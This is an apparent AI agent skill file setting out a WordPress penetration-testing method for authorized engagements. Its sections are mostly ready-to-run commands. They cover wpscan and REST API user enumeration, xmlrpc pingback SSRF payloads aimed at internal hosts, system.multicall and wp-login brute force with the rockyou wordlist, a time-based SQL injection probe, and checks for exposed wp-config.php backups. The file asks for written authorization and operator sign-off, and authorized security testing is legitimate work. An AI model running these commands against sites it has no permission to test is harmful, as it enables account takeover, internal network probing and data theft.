---
name: wordpress-attack
description: >
  WordPress attack methodology for authorized engagements: user
  enumeration, plugin/theme vulnerability identification, xmlrpc.php
  abuse, REST API enumeration, wp-config.php exposure. Keywords:
  WordPress, wpscan, xmlrpc, wp-json, plugin vulnerability, wp-config,
  brute force, pingback. Do NOT use for generic CMS-agnostic web app
  testing (standard web/API testing skills cover that), or for server
  OS privesc once a shell is obtained on the host (see linux-privesc).
metadata:
  type: platform
  phase: hunting
  tools: [wpscan, nmap, curl, wafw00f]
depends_on: [subdomain-discovery]
feeds_into: [chain-analysis, privesc-report]
chains_with: [linux-privesc, network-infra]
---

## Signals
- `/wp-login.php`, `/wp-admin/`, `/wp-content/`, or `wp-json` paths respond.
- `<meta name="generator" content="WordPress ...">` in page source.
- Response headers or `readme.html` reveal version.

## Prerequisites
- Written authorization for the specific domain/IP hosting the WordPress instance.
- `wpscan` with an updated vulnerability database (API token for full WPVulnDB results), `curl`.

## Methodology

### 1. Fingerprint version, theme, plugins
```bash
wpscan --url https://target.com --enumerate vp,vt,u --api-token $WPVULNDB_TOKEN -o wpscan.json -f json
curl -s https://target.com/readme.html | grep -i version
curl -s https://target.com/wp-content/themes/ | grep href
```

### 2. User enumeration
```bash
wpscan --url https://target.com --enumerate u
# Manual: author archive ID iteration
for i in 1 2 3 4 5; do curl -sI "https://target.com/?author=$i" | grep -i location; done
# REST API user enumeration (often reveals usernames even when author archives are disabled)
curl -s https://target.com/wp-json/wp/v2/users | jq '.[].slug'
```

### 3. xmlrpc.php abuse
```bash
# Check if enabled
curl -s -X POST https://target.com/xmlrpc.php -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'

# Pingback-based internal port scanning (SSRF via pingback.ping)
curl -s -X POST https://target.com/xmlrpc.php -H "Content-Type: text/xml" -d '
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://internal-host:22/</string></value></param>
<param><value><string>https://target.com/?p=1</string></value></param>
</params>
</methodCall>'

# Amplified/distributed brute force via system.multicall (bypasses simple rate limiting on wp-login.php)
wpscan --url https://target.com --password-attack xmlrpc -U admin -P /usr/share/wordlists/rockyou.txt
```

### 4. REST API enumeration (wp-json)
```bash
curl -s https://target.com/wp-json/ | jq '.routes | keys'
curl -s https://target.com/wp-json/wp/v2/posts | jq '.[].title'
# Check for exposed endpoints beyond defaults (custom plugin REST routes)
curl -s https://target.com/wp-json/ | jq '.routes | keys[]' | grep -v "^/wp/v2"
```

### 5. Plugin/theme vulnerability exploitation
```bash
wpscan --url https://target.com --enumerate vp --plugins-detection aggressive
# Cross-reference detected plugin+version against wpscan.com vuln feed (included in wpscan output)
# Example: if a known-vulnerable plugin endpoint is found, confirm with its public PoC against THIS target
curl -s "https://target.com/wp-content/plugins/vulnerable-plugin/some_endpoint.php?id=1' AND SLEEP(5)-- -"
```

### 6. wp-config.php / backup file exposure
```bash
for f in wp-config.php wp-config.php.bak wp-config.php.save wp-config.php~ .wp-config.php.swp; do
  curl -s -o /dev/null -w "%{http_code} $f\n" "https://target.com/$f"
done
# Common backup/export paths
curl -s -o /dev/null -w "%{http_code}\n" "https://target.com/wp-content/debug.log"
```

### 7. Login brute force (rate-limit aware)
```bash
wpscan --url https://target.com --usernames found_users.txt --passwords /usr/share/wordlists/rockyou.txt --password-attack wp-login --max-threads 2
```

## Tooling
`wpscan` (with WPVulnDB API token), `curl`, `nmap`, `wafw00f` (confirm WAF presence before noisy brute force).

## Validation Gate
- Plugin/theme version-based findings are **Inferred** at best until the specific CVE's PoC is actually triggered against this target and a verifiable effect observed — version detection alone is not a finding, per project anti-fabrication rules.
- xmlrpc pingback SSRF must show an actual callback/timing difference confirming internal reachability, not just that the endpoint accepted the request.
- Capture full request/response for every exploited endpoint.

## Gotchas
- `xmlrpc.php` being present does not mean `system.multicall`/pingback are usable — many hardened installs disable specific methods via plugins (e.g. Disable XML-RPC).
- Brute force against `wp-login.php` or `xmlrpc.php` can trigger account lockouts (via security plugins like Wordfence) or IP bans — throttle and get operator sign-off before sustained brute forcing, per the destructive-action gate.
- REST API user enumeration can be disabled per-site (`rest_user_query` filter) — a 401/403 there doesn't rule out other enumeration vectors.
- Always confirm WAF presence (`wafw00f`) first; noisy `wpscan` runs against a WAF-protected site waste time and may trigger IP blocking that affects later phases.
